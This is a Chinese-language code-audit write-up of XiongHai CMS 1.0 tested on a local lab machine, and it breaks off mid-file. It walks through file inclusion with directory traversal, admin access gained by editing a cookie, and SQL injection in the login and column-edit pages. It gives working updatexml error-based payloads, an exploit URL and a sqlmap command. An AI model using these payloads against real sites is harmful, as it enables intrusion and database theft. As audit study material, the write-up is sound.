# 环境搭建
熊海cms1.0 （
seay代码审计工具
phpstudy （php版本不能太高)
搭在win7上作为靶机使用：
安装xhcms
注意这里安装的时候要自己先去创建一个数据库
# 代码审计
先丢进seay去审计一波
有34个可疑文件,挨个去看看
## 文件包含
### /index.php
典型的文件包含漏洞,虽然参数经过了addslashes()处理,但是对于文件包含来说没什么用
包含的文件是files目录下的文件，可以包含我在files目录下新建的phpinfo.php,
如果要包含根目录下的文件,通过目录穿越即可
### /admin/index.php
这个文件的代码和刚才的index.php的代码一模一样,利用方式也就相同
只是它包含的文件是admin目录下的files目录里面的文件
## 越权访问
### /inc/checklogin.php
这是个越权漏洞,在seay中并没有被扫出来
先检验cookie中user的值,如果为空则跳转到登陆界面
利用方法
这里不能直接利用,需要配合登陆页面一起使用,在如下地址去测试
    http://192.168.121.130/xhcms/admin
利用admin账户登陆后会添加一个值为admin的cookie
退出登陆可以看到cookie值已经不见
登陆一个已经存在的用户
将cookie中的user修改为admin,登陆到了admin用户
由此可见，所有调用checklogin.php的文件都存在越权漏洞。
涵盖范围：admin/files目录下除login.php和outlogin.php外所有页面
这里应该是凭借cookie中的user来判断用户的,所以随便登陆一个用户,只要user的值为admin那就可以去登陆admin账户实现越权
## SQL注入
### /admin/files/adset.php
提交的参数ad1,ad2,ad3都经过了addslashes修饰
    单纯使用addslashes()函数会造成两个问题：
        是否采用GBK（宽字节注入）
        sql语句是否采用了单引号闭合。
这里不存在sql注入,属于误报,但是他前面包含了两个文件
可以跟进去看看
inc目录下的文件都是配置文件,十分重要
### /admin/files/login.php
seay给出了好多SQL的洞,但是没有给出这个文件
    ""){
    $query = "SELECT * FROM manage WHERE user='$user'";
    $result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    $users = mysql_fetch_array($result);
    if (!mysql_num_rows($result)) {  
    echo "";
    exit;
    }else{
    $passwords=$users['password'];
    if(md5($password)<>$passwords){
    echo "";
    exit;   
        }
    //写入登录信息并记住30天
    if ($checkbox==1){
    setcookie('user',$user,time()+3600*24*30,'/');
    }else{
    setcookie('user',$user,0,'/');
    }
    echo "";
    exit;
    }
    exit;
    ob_end_flush();
    }
    ?>
这里需要去利用admin的登陆页面
    http://192.168.121.130/xhcms/admin/?r=login
    关键代码：
    $login=$_POST['login'];         //参数直接由POST获取，无任何过滤
    $user=$_POST['user'];
    $password=$_POST['password'];
    $checkbox=$_POST['checkbox'];
    $query = "SELECT * FROM manage WHERE user='$user'";
    $result = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    $users = mysql_fetch_array($result);
    $passwords=$users['password'];
    if(md5($password)<>$passwords)  //将输入的password的md5值进行匹配
    {
        echo "";
        exit;   
    }
查询的sql语句是在user这个地方,并且这里参数除了用单引号闭合并没有其他过滤处理了
这里开启了mysql_error()，可以进行报错注入,注入点在user
    1' or updatexml(1,concat(0x7e,(select database()),0x7e),1)#
用sqlmap探测也可以这里
    python sqlmap.py -r 1.txt --dbs --batch
报错方式和注入点sqlmap也给了出来
不过这里跑了好久
### /admin/files/editcolumn.php
这是一个后台的链接界面,我们先登陆进后台,然后去包含这个文件
    http://192.168.121.130/xhcms/admin/?r=editcolumn
其实这个文件夹下的所有文件都需要这么去使用
跳转到了如下界面
关键代码
    $id=$_GET['id'];
    $type=$_GET['type'];
    if ($type==1){
    $query = "SELECT * FROM nav WHERE id='$id'";
    $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    $nav = mysql_fetch_array($resul);
    }
    if ($type==2){
    $query = "SELECT * FROM navclass WHERE id='$id'";
    $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    $nav = mysql_fetch_array($resul);
    }
    $save=$_POST['save'];
    $name=$_POST['name'];
    $keywords=$_POST['keywords'];
    $description=$_POST['description'];
    $px=$_POST['px'];
    $xs=$_POST['xs'];       //变量由POST直接得到，未做过滤
sql语句都差不多,就是单引号闭合而已,主要看参数
这里需要传参type和id参数,type为一或者为2都可以
    http://192.168.121.130/xhcms/admin/?r=editcolumn&type=2&id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
当然控制type参数还可以进入下面的update语句,一样可以去执行语句
### /admin/files/editlink.php
    <?php
    require '../inc/checklogin.php';
    require '../inc/conn.php';
    $linklistopen='class="open"';
    $id=$_GET['id'];
    $query = "SELECT * FROM link WHERE id='$id'";
    $resul = mysql_query($query) or die('SQL语句有误：'.mysql_error());
    $link = mysql_fetch_array($resul);
    $save=$_POST['save'];
    $name=$_POST['name'];
    $url=$_POST['url'];
    $mail=$_POST['mail'];
    $jieshao=$_POST['jieshao'];
    $xs=$_POST['xs'];
    if ($xs==""){
    $xs=1;  
        }
    if ($save==1){
    if ($name==""){
    echo "";
    exit;
    }
    if ($url==""){
    echo "";
    exit;